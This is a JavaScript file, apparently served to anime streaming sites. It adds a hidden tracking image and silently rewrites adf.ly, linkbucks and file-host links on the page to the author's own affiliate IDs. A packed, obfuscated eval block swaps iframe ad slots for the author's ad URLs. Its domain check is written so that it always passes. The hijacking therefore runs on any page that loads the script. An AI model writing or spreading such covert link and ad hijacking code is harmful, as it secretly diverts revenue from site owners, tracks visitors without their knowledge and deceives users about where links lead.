var n = document.createElement('img');
n.setAttribute("src", "http://whos.amung.us/swidget/frans131.png");
n.setAttribute("style", "display: none;");
document.body.appendChild(n);


function searchL(){
	var links = document.getElementsByTagName("a");
	var adf = /http:\/\/adf.ly\/.*?\//;
	var lbk = /http:\/\/.*?\.linkbucks.com\/url\//;
	for (var i = 0; i < links.length; i++) {
		var link = links[i].href;
		var adfL = link.replace(adf, "http://adf.ly/292755/");
		var lbkL = link.replace(lbk, "http://279d36f4.linkbucks.com/url/");
		if (link.match(adf)) {
			links[i].href=adfL;
		}
		if (link.match(lbk)) {
			links[i].href=lbkL;
		}
		addL(link, i);
	}
}
function addL(link, i) {
	var links = document.getElementsByTagName("a");
	var domains = ['4fastfile.com', 'bitshare.com', 'depositfiles.com', 'megaupload.com', 'easy-share.com', 'downupload.com', 'extabit.com', 'filefactory.com', 'fileserve.com', 'freakshare.com', 'hitfile.net', 'hotfile.com', 'megashares.com', 'turbobit.net', 'uploading.com', 'uploadstation.com', 'vip-file.com'];
	for (var i = 0; i < domains.length; i++) {
		if (link.match("^(http|https)\:\/\/(www\.|d01\.)?" + domains[i].replace("\.", "\\\."))) {
			links[i].href = "http://2a170c8a.linkbucks.com/url/" + link;
        	}
	}
}

if( !location.href.match(/^http:\/\/(www\.)?veranimesonline\.(com|net|tv)/i) || !location.href.match(/^http:\/\/(www\.)?dblatino\.net/i) || !location.href.match(/^http:\/\/(www\.)?anime-flv\.(com|net|tv)/i) || !location.href.match(/^http:\/\/(www\.)?danimes\.(com|net|tv)/i) || !location.href.match(/^http:\/\/(www\.)?ver-anime\.(com|org)/i) || !location.href.match(/^http:\/\/(www\.)?todo-animes\.(com|org)/i) || !location.href.match(/^http:\/\/(www\.)?todoanimes\.(org)/i) || !location.href.match(/^http:\/\/(www\.)?animexperto\.(com|net)/i) || !location.href.match(/^http:\/\/(www\.)?xtremeanimek\.(com|net)/i) || !location.href.match(/^http:\/\/(www\.)?knime\.(com|net)/i) || !location.href.match(/^http:\/\/(www\.)?hentaiflv\.net/i) || !location.href.match(/^http:\/\/(www\.)?hentaicompleto\.net/i) || !location.href.match(/^http:\/\/(www\.)?cineid\.net/i) || !location.href.match(/^http:\/\/(www\.)?mundoanimehd\.com/i) || !location.href.match(/^http:\/\/(www\.)?libroanime\.com/i) || !location.href.match(/^http:\/\/(www\.)?animedex\.net/i)
){searchL();}


eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('t q(){u v}t y(a){2(a.4=="w"&&a.5=="M"){a.1="3://9.8.6/c/w.b"}7 2(a.4=="x"&&a.5=="m"){a.1="3://9.8.6/c/x.b"}7 2(a.4=="z"&&a.5=="A"){a.1="3://9.8.6/c/z.b"}7 2(a.4=="o"&&a.5=="A"){a.1="3://9.8.6/c/p/o.b"}7 2(a.4=="n"&&a.5=="r"){a.1="3://9.8.6/c/p/n.b"}7 2(a.4=="K"&&a.5=="H"){a.1="3://g.h.6/?j=k&l=e&d=G"}7 2(a.4=="C"&&a.5=="C"){a.1="3://g.h.6/?j=k&l=e&d=D"}7 2(a.4=="F"&&a.5=="r"){a.1="3://g.h.6/?j=k&l=e&d=J"}7 2(a.4=="m"&&a.5=="m"){a.1="3://g.h.6/?j=k&l=e&d=D"}u v}2(q()){B f=I.E("s");L(B i=0;i<f.N;i++){s=f[i].1;y(f[i])}}',50,50,'|src|if|http|width|height|com|else|veranimesonline|plugin||html|ads|ad_size|banner|iframes|tag|tlvmedia||id|102230_143085|ad_type|250|468|120|adnet|validHost|60|iframe|function|return|true|728|300|otranet|160|600|var|125|250x250|getElementsByTagName|234|336x280|280|document|234x60|336|for|90|length'.split('|'),0,{}))
